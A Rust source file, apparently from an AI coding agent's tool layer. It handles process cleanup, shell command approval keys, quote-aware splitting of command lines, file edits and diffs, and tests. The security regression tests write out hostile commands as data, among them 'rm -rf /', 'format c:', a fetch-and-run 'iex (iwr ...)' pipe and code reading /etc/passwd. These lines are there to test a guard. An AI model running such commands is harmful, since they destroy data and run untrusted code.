                    std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
                );
                if ok == 0 || AssignProcessToJobObject(job, raw as HANDLE) == 0 {
                    tracing::warn!("could not put the shell in a job object; child processes may outlive it");
                    CloseHandle(job);
                    return None;
                }
                Some(Self(job))
            }
        }

        pub fn kill(&self) {
            // SAFETY: self.0 is a valid job handle until drop.
            unsafe {
                TerminateJobObject(self.0, 1);
            }
        }
    }

    impl Drop for TreeGuard {
        fn drop(&mut self) {
            // SAFETY: closing the last handle kills every process in the job.
            unsafe {
                CloseHandle(self.0);
            }
        }
    }
}

#[cfg(unix)]
pub(crate) mod proc_tree {
    pub struct TreeGuard(u32);

    impl TreeGuard {
        pub fn attach(child: &tokio::process::Child) -> Option<Self> {
            child.id().map(Self)
        }

        /// [`Self::attach`] for a `std::process::Child` started with `process_group(0)`.
        pub fn attach_std(child: &std::process::Child) -> Option<Self> {
            Some(Self(child.id()))
        }

        pub fn kill(&self) {
            // The shell was started with process_group(0), so its pid is the group id.
            let _ = std::process::Command::new("kill").arg("-KILL").arg(format!("-{}", self.0)).status();
        }
    }

    impl Drop for TreeGuard {
        fn drop(&mut self) {
            self.kill();
        }
    }
}

/// `powershell.exe -NoProfile -Command <cmd>` on Windows, `sh -c` (own process group) elsewhere.
pub fn shell_command(command: &str) -> tokio::process::Command {
    #[cfg(windows)]
    {
        let mut c = tokio::process::Command::new("powershell.exe");
        c.args(["-NoProfile", "-NonInteractive", "-Command", command]);
        c.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
        c
    }
    #[cfg(not(windows))]
    {
        let mut c = tokio::process::Command::new("sh");
        c.args(["-c", command]);
        c.process_group(0);
        c
    }
}

/// The approval key for "Always allow" on a shell command: the command verb plus, when the
/// verb is a well-known subcommand runner (`git`, `cargo`, `npm`, ...), its first argument.
/// Lowercased. A compound command yields an empty string, which callers treat as "nothing to
/// remember". Using only the first word meant approving `git status` also approved
/// `git push --force`, and any flag added to the approved line came along for free.
///
/// Commands that accept inline code via a flag (`python -c`, `node -e`, `sh -c`, `bash -c`, ...)
/// are never session-approved: the root key would be `python`, and a later `python -c
/// "exec(...)"` would silently inherit the approval. The flag is structural — the argument is
/// the program — so approving it once cannot safely approve it again with different code.
pub fn root_command(command: &str) -> String {
    if !is_simple_command(command) {
        return String::new();
    }
    // A deletion never gets a session key, so an earlier "Always allow 'rm'" cannot approve
    // the next `rm notes.txt`: every deletion asks on its own.
    if deletes_files(command) {
        return String::new();
    }
    let mut words = command.split_whitespace().map(|w| w.trim_matches(['"', '\'']).to_lowercase());
    let Some(first) = words.next() else { return String::new() };
    let first = first.trim_start_matches('&');
    let first = [".exe", ".cmd", ".bat", ".com"].iter().find_map(|e| first.strip_suffix(e)).unwrap_or(first).to_owned();
    if first.is_empty() {
        return String::new();
    }
    // Reject inline-code flags before looking up the subcommand: `python -c "..."`, `node -e`,
    // `sh -c`, `bash -c`, `perl -e`, `ruby -e`, `deno eval`, `node --eval`, etc.
    // The full argument list is checked (not just the second token) so `python -q -c "..."` is
    // also rejected. Flags are checked case-sensitively: `-c` is an inline-code flag but `-C`
    // is git's directory-switch flag and must not be blocked.
    const INLINE_CODE_FLAGS: &[&str] = &["-c", "-e", "-m", "--eval", "--execute", "eval"];
    let rest: Vec<String> = command.split_whitespace()
        .skip(1)  // skip the already-processed verb
        .map(|w| w.trim_matches(['"', '\'']).to_owned())
        .collect();
    if rest.iter().any(|t| INLINE_CODE_FLAGS.contains(&t.as_str())) {
        return String::new();
    }
    if SUBCOMMAND_RUNNERS.iter().any(|r| r == &first) {
        if let Some(second) = rest.first() {
            // Only a bare word is a subcommand; a path, flag or value is left out.
            if !second.is_empty()
                && !second.starts_with('-')
                && !second.starts_with('/')
                && !second.contains('\\')
                && !second.contains('/')
            {
                return format!("{first} {second}");
            }
        }
    }
    first
}

/// Commands whose exact behavior depends on the subcommand that follows (`git status` vs
/// `git push`), so a session approval records both words.
const SUBCOMMAND_RUNNERS: &[&str] =
    &["git", "cargo", "npm", "npx", "pnpm", "yarn", "node", "python", "python3", "go", "dotnet", "pip", "pip3", "docker", "kubectl", "gh"];

/// True when `command` is one simple command: no chaining, piping, subexpressions, script
/// blocks or redirection. Only simple commands may be session-approved by root word.
///
/// A separator or grouping character inside quotes is text, not syntax — the shell does not act
/// on it — so `python -c "print('x')"` is one simple command. Outside quotes the old rules hold:
/// `(Remove-Item ...)` is a PowerShell subexpression and `$(..)` / backticks run a command the
/// text does not show, so a line carrying any of them is never simple. A `\"` inside double
/// quotes closes the string, which is what PowerShell does; `sh` would instead treat it as an
/// escape, and the mismatch only ever splits the line further (more asks, never fewer).
pub fn is_simple_command(command: &str) -> bool {
    scan(command).is_some_and(|p| p.len() == 1 && !p[0].redirect)
}

/// Sub-commands of a command line, split on `;`, `&&`, `||`, `|`, `&` and newlines the shell
/// would act on.
///
/// Returns `None` when the line contains constructs whose effect cannot be judged from the
/// text (subexpressions `$(..)` / `@(..)`, parentheses, script blocks, backticks outside single
/// quotes, an unterminated quote), and for empty parts (`a;;b`, trailing `|`). A simple command
/// yields exactly one part.
pub fn command_parts(command: &str) -> Option<Vec<String>> {
    scan(command).map(|p| p.into_iter().map(|p| p.text).collect())
}

/// Quote state while [`scan`] walks a line.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Quote {
    Bare,
    Double,
    Single,
}

/// One command of a line, as the shell would cut it.
struct ScannedPart {
    text: String,
    /// An unquoted `<` or `>` appears here: output goes to a file instead of back to us.
    redirect: bool,
}

/// Cut `command` at the separators the shell acts on, ignoring the ones inside quotes.
///
/// Parts are slices of the original text, quotes included: callers compare them against
/// allowlist rules and the denylist, and those read the line as written.
fn scan(command: &str) -> Option<Vec<ScannedPart>> {
    let c = command.trim();
    let mut parts: Vec<ScannedPart> = Vec::new();
    // Start of the part being collected, and whether it has an unquoted redirect yet.
    let mut start = 0;
    let mut redirect = false;
    let mut quote = Quote::Bare;
    let mut chars = c.char_indices().peekable();
    while let Some((i, ch)) = chars.next() {
        let next = chars.peek().map(|(_, n)| *n);
        match quote {
            // Single quotes are literal in both shells; the only thing that does anything is
            // a doubled quote, which PowerShell reads as one escaped quote and `sh` as the end
            // of one string and the start of the next — either way no separator sits between
            // them, so skipping the pair is safe.
            Quote::Single => match ch {
                '\'' if next == Some('\'') => {
                    chars.next();
                }
                '\'' => quote = Quote::Bare,
                _ => {}
            },
            // Double quotes are literal except for the two constructs that still execute: a
            // backtick (PowerShell escape, `sh` command substitution) and `$(..)`.
            Quote::Double => match ch {
                '"' => quote = Quote::Bare,
                '`' => return None,
                '$' if next == Some('(') => return None,
                _ => {}
            },
            Quote::Bare => match ch {
                '\'' => quote = Quote::Single,
                '"' => quote = Quote::Double,
                '`' => return None,
                '(' | ')' | '{' | '}' => return None,
                '$' | '@' if next == Some('(') => return None,
                ';' | '|' | '&' | '\n' | '\r' => {
                    parts.push(ScannedPart { text: c[start..i].trim().to_owned(), redirect });
                    start = i + ch.len_utf8();
                    redirect = false;
                }
                '<' | '>' => redirect = true,
                _ => {}
            },
        }
    }
    if quote != Quote::Bare {
        return None;
    }
    parts.push(ScannedPart { text: c[start..].trim().to_owned(), redirect });
    // `&&` / `||` produce one empty piece between the two separators; allow exactly that, and
    // drop it: it is syntax, not a command.
    let n = parts.len();
    let mut empties = 0;
    for (i, p) in parts.iter().enumerate() {
        if p.text.is_empty() {
            empties += 1;
            // Leading/trailing separators or a run of three are not valid chaining.
            if i == 0 || i == n - 1 || empties > 1 {
                return None;
            }
        } else {
            empties = 0;
        }
    }
    parts.retain(|p| !p.text.is_empty());
    if parts.is_empty() {
        return None;
    }
    Some(parts)
}

/// Every fragment that might run, for denylist scanning. Unlike [`command_parts`] this never
/// gives up: it also splits on subexpression and script-block delimiters so `git $(rm -rf /)`
/// yields `rm -rf /`. Leading `&`, `@`, `$`, `.` call markers are stripped.
pub fn command_fragments(command: &str) -> Vec<String> {
    command
        .split([';', '|', '&', '\n', '\r', '`', '(', ')', '{', '}'])
        .map(|p| p.trim().trim_start_matches(['@', '$', '.', ' ']).trim().to_owned())
        .filter(|p| !p.is_empty())
        .collect()
}

/// Exact-string edit semantics of `replace` (PROTOCOL 3.3). `current` is `None` for a missing file.
pub fn apply_replace(
    current: Option<&str>,
    old_string: &str,
    new_string: &str,
    allow_multiple: bool,
    display_path: &str,
) -> Result<String, ToolError> {
    match current {
        None if old_string.is_empty() => Ok(new_string.to_owned()),
        None => Err(ToolError::FileNotFound(display_path.into())),
        Some(_) if old_string.is_empty() => Err(ToolError::CreateExisting(display_path.into())),
        Some(_) if old_string == new_string => Err(ToolError::NoChange),
        Some(text) => {
            let n = text.matches(old_string).count();
            match n {
                0 => Err(ToolError::NoOccurrence(display_path.into())),
                1 => Ok(text.replacen(old_string, new_string, 1)),
                _ if allow_multiple => Ok(text.replace(old_string, new_string)),
                _ => Err(ToolError::OccurrenceMismatch(n)),
            }
        }
    }
}

/// Unified diff (3 lines of context) for confirmation dialogs, size-capped.
pub fn unified_diff(path: &str, old: &str, new: &str) -> String {
    if old.len() + new.len() > DIFF_MAX_INPUT_BYTES {
        return format!(
            "--- a/{path}\n+++ b/{path}\n[file too large to diff: {} bytes -> {} bytes]\n",
            old.len(),
            new.len()
        );
    }
    let mut diff = similar::TextDiff::from_lines(old, new)
        .unified_diff()
        .context_radius(3)
        .header(&format!("a/{path}"), &format!("b/{path}"))
        .to_string();
    if diff.len() > DIFF_MAX_BYTES {
        truncate_at_char(&mut diff, DIFF_MAX_BYTES);
        diff.push_str("\n[diff truncated]\n");
    }
    diff
}

/// SHA-256 of file text, used to pin approvals to the previewed content.
fn hash_text(s: &str) -> [u8; 32] {
    sha2::Sha256::digest(s.as_bytes()).into()
}

/// Read a text file with a size limit. `Ok(None)` when it does not exist.
fn read_text_limited(path: &Path, display: &str, limit: u64) -> Result<Option<String>, ToolError> {
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(e.into()),
    };
    if meta.len() > limit {
        return Err(ToolError::TooLarge { path: display.into(), size: meta.len(), limit });
    }
    let mut s = String::new();
    std::fs::File::open(path)?
        .take(limit + 1)
        .read_to_string(&mut s)
        .map_err(|e| ToolError::Io(format!("{display}: {e}")))?;
    Ok(Some(s))
}

fn looks_binary(head: &[u8]) -> bool {
    head[..head.len().min(8192)].contains(&0)
}

fn cut_line(l: &str) -> String {
    if l.chars().count() > READ_MAX_LINE_CHARS {
        l.chars().take(READ_MAX_LINE_CHARS).collect::<String>() + "..."
    } else {
        l.to_owned()
    }
}

fn truncate_at_char(s: &mut String, max: usize) {
    if s.len() > max {
        let mut cut = max;
        while !s.is_char_boundary(cut) {
            cut -= 1;
        }
        s.truncate(cut);
    }
}

fn cap_output(mut s: String) -> String {
    if s.len() > TOOL_OUTPUT_MAX_BYTES {
        truncate_at_char(&mut s, TOOL_OUTPUT_MAX_BYTES);
        s.push_str("\n[output truncated]");
    }
    s
}

/// Files under `base`, skipping `.git`, `target` and `node_modules`. Symlinks are not followed.
fn walk_files(base: &Path) -> impl Iterator<Item = PathBuf> {
    walkdir::WalkDir::new(base)
        .into_iter()
        .filter_entry(|e| !matches!(e.file_name().to_str(), Some(".git" | "target" | "node_modules")))
        .flatten()
        .filter(|e| e.file_type().is_file())
        .map(|e| e.into_path())
}

fn str_arg<'a>(args: &'a Value, key: &str) -> Result<&'a str, ToolError> {
    args.get(key).and_then(Value::as_str).ok_or_else(|| ToolError::InvalidArgs(format!("missing string '{key}'")))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ws() -> (tempfile::TempDir, ToolRegistry) {
        let dir = tempfile::tempdir().unwrap();
        let reg = ToolRegistry::new(Workspace::new(dir.path()).unwrap(), ToolLimits::default());
        (dir, reg)
    }

    #[test]
    fn path_guard_rejects_escapes() {
        let (_d, reg) = ws();
        assert!(reg.workspace().resolve("a/b.txt").is_ok());
        assert!(matches!(reg.workspace().resolve("../x"), Err(ToolError::OutsideWorkspace(_))));
        assert!(matches!(reg.workspace().resolve("new/../../x"), Err(ToolError::OutsideWorkspace(_))));
        assert!(matches!(reg.workspace().resolve("C:/Windows"), Err(ToolError::OutsideWorkspace(_))));
    }

    #[test]
    fn replace_semantics() {
        assert_eq!(apply_replace(Some("a b a"), "b", "c", false, "f").unwrap(), "a c a");
        assert_eq!(apply_replace(Some("a b a"), "a", "c", false, "f"), Err(ToolError::OccurrenceMismatch(2)));
        assert_eq!(apply_replace(Some("a b a"), "a", "c", true, "f").unwrap(), "c b c");
        assert!(matches!(apply_replace(Some("x"), "y", "z", false, "f"), Err(ToolError::NoOccurrence(_))));
        assert_eq!(apply_replace(Some("x"), "x", "x", false, "f"), Err(ToolError::NoChange));
        assert_eq!(apply_replace(None, "", "new", false, "f").unwrap(), "new");
        assert!(matches!(apply_replace(None, "x", "y", false, "f"), Err(ToolError::FileNotFound(_))));
        assert!(matches!(apply_replace(Some("x"), "", "y", false, "f"), Err(ToolError::CreateExisting(_))));
    }

    /// Erasing a file is its own confirmation: never an `Edit`, never session-approved.
    #[tokio::test]
    async fn an_empty_write_over_an_existing_file_is_a_delete_confirmation() {
        let (d, reg) = ws();
        std::fs::write(d.path().join("f.txt"), "important\n").unwrap();
        let args = json!({"file_path":"f.txt","content":"   \n"});
        match reg.confirmation(WRITE_FILE, &args).unwrap() {
            ConfirmationDetails::Delete { path, old_hash } => {
                assert!(path.ends_with("f.txt"), "{path}");
                assert!(old_hash.is_some(), "pinned to the content the user saw");
            }
            other => panic!("expected Delete, got {other:?}"),
        }
        // The file is untouched by the preview.
        assert_eq!(std::fs::read_to_string(d.path().join("f.txt")).unwrap(), "important\n");

        // A new file with empty content is a plain creation, not a deletion.
        let new = json!({"file_path":"new.txt","content":""});
        assert!(matches!(reg.confirmation(WRITE_FILE, &new).unwrap(), ConfirmationDetails::Edit { is_new_file: true, .. }));

        // An ordinary overwrite stays an Edit.
        let edit = json!({"file_path":"f.txt","content":"changed\n"});
        assert!(matches!(reg.confirmation(WRITE_FILE, &edit).unwrap(), ConfirmationDetails::Edit { is_new_file: false, .. }));

        // A file that changed after the deletion was previewed is refused, not erased.
        let approved = reg.confirmation(WRITE_FILE, &args).unwrap();
        std::fs::write(d.path().join("f.txt"), "someone else wrote this\n").unwrap();
        let r = reg.execute_with(WRITE_FILE, &args, Some(&approved), &CancellationToken::new()).await;
        assert!(matches!(r, Err(ToolError::WriteFailure(_))), "must refuse a changed target: {r:?}");
        assert_eq!(std::fs::read_to_string(d.path().join("f.txt")).unwrap(), "someone else wrote this\n");
    }

    #[test]
    fn schemas_are_objects_with_required() {
        let (_d, reg) = ws();
        for d in reg.declarations() {
            assert_eq!(d.parameters_json_schema["type"], "object", "{}", d.name);
            assert!(d.parameters_json_schema["required"].is_array());
            assert!(reg.kind(&d.name).is_some());
        }
    }

    #[tokio::test]
    async fn write_then_read_range() {
        let (_d, reg) = ws();
        reg.execute(WRITE_FILE, &json!({"file_path":"s/a.txt","content":"1\n2\n3\n"})).await.unwrap();
        let out = reg.execute(READ_FILE, &json!({"file_path":"s/a.txt","start_line":2,"end_line":2})).await.unwrap();
        assert!(out.llm_content.ends_with('2'));
        assert!(out.llm_content.starts_with("[Showing lines 2-2 of 3]"));
    }

    #[tokio::test]
    async fn glob_and_search() {
        let (d, reg) = ws();
        std::fs::create_dir_all(d.path().join("src")).unwrap();
        std::fs::write(d.path().join("src/a.rs"), "fn main() {}
let x = 1;
").unwrap();
        std::fs::write(d.path().join("b.txt"), "fn not_rust
").unwrap();
        let g = reg.execute(GLOB, &json!({"pattern":"**/*.rs"})).await.unwrap();
        assert!(g.llm_content.contains("a.rs") && !g.llm_content.contains("b.txt"));
        let s = reg.execute(SEARCH_FILE_CONTENT, &json!({"pattern":"^fn ","include_pattern":"**/*.rs"})).await.unwrap();
        assert_eq!(s.display, "1 matches");
        assert!(s.llm_content.contains(":1: fn main"));
        assert!(matches!(reg.execute(SEARCH_FILE_CONTENT, &json!({"pattern":"("})).await, Err(ToolError::InvalidArgs(_))));
        assert!(matches!(reg.execute(GLOB, &json!({"pattern":"*","dir_path":".."})).await, Err(ToolError::OutsideWorkspace(_))));
    }

    #[tokio::test]
    async fn replace_tool_and_preview_diff() {
        let (d, reg) = ws();
        std::fs::write(d.path().join("f.txt"), "alpha
beta
").unwrap();
        let args = json!({"file_path":"f.txt","old_string":"beta","new_string":"gamma"});
        match reg.confirmation(REPLACE, &args).unwrap() {
            ConfirmationDetails::Edit { diff, is_new_file, .. } => {
                assert!(!is_new_file);
                assert!(diff.contains("-beta") && diff.contains("+gamma"));
            }
            other => panic!("{other:?}"),
        }
        // Preview must not modify the file.
        assert_eq!(std::fs::read_to_string(d.path().join("f.txt")).unwrap(), "alpha
beta
");
        reg.execute(REPLACE, &args).await.unwrap();
        assert_eq!(std::fs::read_to_string(d.path().join("f.txt")).unwrap(), "alpha
gamma
");
        assert!(matches!(reg.confirmation(READ_FILE, &json!({"file_path":"f.txt"})).unwrap(), ConfirmationDetails::Read { .. }));
    }

    #[tokio::test]
    async fn shell_output_cap_and_timeout() {
        let dir = tempfile::tempdir().unwrap();
        let limits = ToolLimits { shell_timeout: Duration::from_secs(60), shell_output_cap: 16 };
        let reg = ToolRegistry::new(Workspace::new(dir.path()).unwrap(), limits);
        let out = reg.execute(RUN_SHELL_COMMAND, &json!({"command":"Write-Output ('x' * 100)"})).await.unwrap();
        assert!(out.llm_content.contains("[output truncated"), "{}", out.llm_content);
        assert!(out.llm_content.contains("Exit Code: 0"));
        let limits = ToolLimits { shell_timeout: Duration::from_millis(300), shell_output_cap: 1024 };
        let reg = ToolRegistry::new(Workspace::new(dir.path()).unwrap(), limits);
        let r = reg.execute(RUN_SHELL_COMMAND, &json!({"command":"Start-Sleep -Seconds 20"})).await;
        assert!(matches!(r, Err(ToolError::Timeout(_))));
        assert_eq!(root_command("Git status --short"), "git status");
    }

    #[test]
    fn compound_commands_are_not_simple() {
        assert!(is_simple_command("git status --short"));
        for c in [
            "git status; Remove-Item -Recurse -Force ~",
            "git log | iex (iwr http://x)",
            "git a && b",
            "git $(whoami)",
            "git @(1)",
            "git x > out.txt",
            "git x\nrm y",
            "git & calc",
            "git {x}",
            "git `n",
            // Quoting hides separators, but not what a quote cannot hide: `$(..)` and
            // backticks still execute inside double quotes, and an unterminated quote leaves
            // the rest of the line unjudgeable.
            "git log \"$(whoami)\"",
            "git log \"`whoami\"",
            "git log 'x",
            "python -c \"print(1)",
        ] {
            assert!(!is_simple_command(c), "{c}");
        }
    }

    /// A separator or a bracket inside quotes is text — the shell does not act on it — so a
    /// line that only looks compound is one simple command.
    #[test]
    fn quoted_separators_and_brackets_are_text() {
        assert!(is_simple_command("python -c \"print('x')\""));
        assert!(is_simple_command("git log --grep=\"a|b;c\""));
        assert!(is_simple_command("echo 'a > b'"));
        assert!(is_simple_command("echo \"a && b\""));
        assert!(is_simple_command("git commit -m \"fix(parser): handle; quotes\""));
        // A redirect is still a redirect wherever it is written.
        assert!(!is_simple_command("echo x > \"out.txt\""));
        assert_eq!(command_parts("echo \"a; b\" | more").unwrap(), vec!["echo \"a; b\"", "more"]);
    }

    /// The line that made this change: two `python` runs joined by `;`, the second carrying
    /// `(`, `)` and `;` inside a double-quoted argument.
    #[test]
    fn a_quoted_script_argument_no_longer_hides_the_chain() {
        let c = "python -V; python -c \"import requests,sys;print('requests ok')\"";
        assert!(!is_simple_command(c), "two commands are two commands");
        assert_eq!(command_parts(c).unwrap(), vec!["python -V", "python -c \"import requests,sys;print('requests ok')\""]);
        assert!(is_simple_command("python -c \"import requests,sys;print('requests ok')\""));
        // PowerShell's escaped quote (`""`) and a doubled single quote are one literal quote.
        assert!(is_simple_command("echo \"say \"\"hi\"\"\""));
        assert!(is_simple_command("echo 'it''s'"));
    }

    #[test]
    fn command_parts_split_chains() {
        assert_eq!(command_parts("git status").unwrap(), vec!["git status"]);
        assert_eq!(command_parts("cargo fmt && cargo test | more").unwrap(), vec!["cargo fmt", "cargo test", "more"]);
        assert_eq!(command_parts("a; b || c").unwrap(), vec!["a", "b", "c"]);
        assert_eq!(command_parts("echo x > out.txt").unwrap(), vec!["echo x > out.txt"]);
        for c in ["", "git $(whoami)", "git @(1)", "git `n", "x {y}", "; a", "a |", "a ;;; b", "git \"x", "git $(whoami) \"a\" ; b"] {
            assert!(command_parts(c).is_none(), "{c:?}");
        }
    }

    #[test]
    fn fragments_see_inside_subexpressions() {
        let f = command_fragments("git log $(rm -rf /) | & format c:");
        assert!(f.contains(&"rm -rf /".to_owned()), "{f:?}");
        assert!(f.contains(&"format c:".to_owned()), "{f:?}");
    }

    #[cfg(windows)]
    #[test]
    fn dangling_link_is_rejected() {
        // A junction to a missing target: exists() is false but the entry is there.
        let (d, reg) = ws();
        let outside = tempfile::tempdir().unwrap();
        let target = outside.path().join("gone");
        std::fs::create_dir(&target).unwrap();
        let link = d.path().join("evil");
        let ok = std::process::Command::new("cmd")
            .args(["/C", "mklink", "/J"])
            .arg(&link)
            .arg(&target)
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if !ok {
            return; // junction creation not available here
        }
        std::fs::remove_dir(&target).unwrap();
        assert!(!link.exists());
        assert!(matches!(reg.workspace().resolve("evil"), Err(ToolError::OutsideWorkspace(_))));
        assert!(matches!(reg.workspace().resolve("evil/x.txt"), Err(ToolError::OutsideWorkspace(_))));
    }

    #[tokio::test]
    async fn edit_refused_when_file_changed_after_approval() {
        let (d, reg) = ws();
        std::fs::write(d.path().join("f.txt"), "one\n").unwrap();
        let args = json!({"file_path":"f.txt","content":"two\n"});
        let approved = reg.confirmation(WRITE_FILE, &args).unwrap();
        std::fs::write(d.path().join("f.txt"), "changed\n").unwrap();
        let r = reg.execute_with(WRITE_FILE, &args, Some(&approved), &CancellationToken::new()).await;
        assert!(matches!(r, Err(ToolError::WriteFailure(_))), "{r:?}");
        assert_eq!(std::fs::read_to_string(d.path().join("f.txt")).unwrap(), "changed\n");
        let approved = reg.confirmation(WRITE_FILE, &args).unwrap();
        reg.execute_with(WRITE_FILE, &args, Some(&approved), &CancellationToken::new()).await.unwrap();
        assert_eq!(std::fs::read_to_string(d.path().join("f.txt")).unwrap(), "two\n");
    }

    #[tokio::test]
    async fn grep_search_options_and_alias() {
        let (d, reg) = ws();
        std::fs::write(d.path().join("a.txt"), "foo 1\nfoo 2\nfoo skip\n").unwrap();
        std::fs::write(d.path().join("b.txt"), "foo 3\n").unwrap();
        std::fs::write(d.path().join("bin.dat"), b"foo\0bin").unwrap();
        let r = reg.execute(GREP_SEARCH, &json!({"pattern":"foo","exclude_pattern":"skip"})).await.unwrap();
        assert_eq!(r.display, "3 matches");
        assert!(!r.llm_content.contains("bin.dat"));
        let r = reg.execute(GREP_SEARCH, &json!({"pattern":"foo","names_only":true})).await.unwrap();
        assert_eq!(r.display, "2 files");
        let r = reg.execute(GREP_SEARCH, &json!({"pattern":"foo","max_matches_per_file":1})).await.unwrap();
        assert_eq!(r.display, "2 matches");
        let r = reg.execute(GREP_SEARCH, &json!({"pattern":"foo","total_max_matches":2})).await.unwrap();
        assert_eq!(r.display, "2 matches");
        assert!(reg.kind(SEARCH_FILE_CONTENT).is_some());
        assert!(reg.declarations().iter().any(|d| d.name == GREP_SEARCH));
    }

    #[tokio::test]
    async fn long_lines_are_cut_and_big_files_refused() {
        let (d, reg) = ws();
        std::fs::write(d.path().join("long.txt"), format!("{}\n", "x".repeat(READ_MAX_LINE_CHARS * 3))).unwrap();
        let r = reg.execute(READ_FILE, &json!({"file_path":"long.txt"})).await.unwrap();
        assert!(r.llm_content.len() < READ_MAX_LINE_CHARS + 10);
        let f = std::fs::File::create(d.path().join("big.txt")).unwrap();
        f.set_len(READ_MAX_FILE_BYTES + 1).unwrap();
        drop(f);
        let r = reg.execute(READ_FILE, &json!({"file_path":"big.txt"})).await;
        assert!(matches!(r, Err(ToolError::TooLarge { .. })));
    }

    #[cfg(windows)]
    #[tokio::test]
    async fn shell_timeout_kills_child_processes() {
        let dir = tempfile::tempdir().unwrap();
        let marker = dir.path().join("marker.txt");
        let limits = ToolLimits { shell_timeout: Duration::from_millis(1500), shell_output_cap: 1024 };
        let reg = ToolRegistry::new(Workspace::new(dir.path()).unwrap(), limits);
        // The grandchild appends to the marker every 200 ms, forever.
        let cmd = format!(
            "Start-Process -NoNewWindow -FilePath powershell.exe -ArgumentList '-NoProfile','-Command','while($true){{Add-Content -Path \"{}\" -Value x; Start-Sleep -Milliseconds 200}}'; Start-Sleep -Seconds 30",
            marker.display()
        );
        let r = reg.execute(RUN_SHELL_COMMAND, &json!({ "command": cmd })).await;
        assert!(matches!(r, Err(ToolError::Timeout(_))), "{r:?}");
        tokio::time::sleep(Duration::from_millis(800)).await;
        let len1 = std::fs::metadata(&marker).map(|m| m.len()).unwrap_or(0);
        tokio::time::sleep(Duration::from_millis(1200)).await;
        let len2 = std::fs::metadata(&marker).map(|m| m.len()).unwrap_or(0);
        assert_eq!(len1, len2, "grandchild kept running after timeout");
    }

    #[tokio::test]
    async fn shell_output_is_capped_while_streaming() {
        let dir = tempfile::tempdir().unwrap();
        let limits = ToolLimits { shell_timeout: Duration::from_secs(60), shell_output_cap: 1024 };
        let reg = ToolRegistry::new(Workspace::new(dir.path()).unwrap(), limits);
        let out = reg.execute(RUN_SHELL_COMMAND, &json!({"command":"1..2000 | ForEach-Object { 'y' * 1000 }"})).await.unwrap();
        assert!(out.llm_content.contains("[output truncated"), "{}", &out.llm_content[..200]);
        assert!(out.llm_content.len() < 2048);
    }

    // --- security regressions ---------------------------------------------------------

    #[test]
    fn parentheses_are_never_simple() {
        for c in [
            "ls (Remove-Item -Recurse C:\\x)",
            "gi (Get-Content secret.txt)",
            "git status (echo hi)",
            "echo )",
        ] {
            assert!(!is_simple_command(c), "{c}");
        }
        // Compound via parentheses is not session-approvable: root_command is empty.
        assert_eq!(root_command("ls (Remove-Item -Recurse C:\\x)"), "");
        assert_eq!(root_command("git status; rm x"), "");
        assert_eq!(root_command("git status --short"), "git status");
        // Inline-code flags must never yield a session key: `python -c "..."` inheriting a
        // prior `python -V` approval would let arbitrary code run without prompting.
        assert_eq!(root_command("python -c \"exec(open('/etc/passwd').read())\""), "", "python -c must be empty");
        assert_eq!(root_command("node -e 'require(\"child_process\").exec(\"id\")'"), "", "node -e must be empty");
        assert_eq!(root_command("python -q -c 'import os'"), "", "python -q -c must be empty");
        assert_eq!(root_command("sh -c 'rm -rf /'"), "", "sh -c must be empty");
        assert_eq!(root_command("node --eval 'x'"), "", "node --eval must be empty");
        // But plain invocations still produce a key.
        assert_eq!(root_command("python -V"), "python");
        assert_eq!(root_command("node --version"), "node");
    }

    #[test]
    fn windows_reserved_device_names() {
        for n in [
            "CON", "con", "PRN", "aux", "NUL", "nul.txt", "COM1", "com9.txt", "LPT1", "lpt3.log",
            "nul.tar.gz", "con.", "COM\u{b9}",
        ] {
            assert!(is_reserved_device_name(n), "{n}");
        }
        for n in ["console", "nully.txt", "com0", "com10", "lpt0", "auxiliary", "main.rs", "nol"] {
            assert!(!is_reserved_device_name(n), "{n}");
        }
    }

    #[test]
    fn resolve_rejects_device_names() {
        let (d, reg) = ws();
        for p in ["NUL", "con.txt", "sub/COM1", "deep/aux.log"] {
            assert!(
                matches!(reg.workspace().resolve(p), Err(ToolError::OutsideWorkspace(_))),
                "{p} resolved to {:?}",
                reg.workspace().resolve(p)
            );
        }
        // Existing paths open normally.
        std::fs::write(d.path().join("ok.txt"), "x").unwrap();
        assert!(reg.workspace().resolve("ok.txt").is_ok());
    }
}
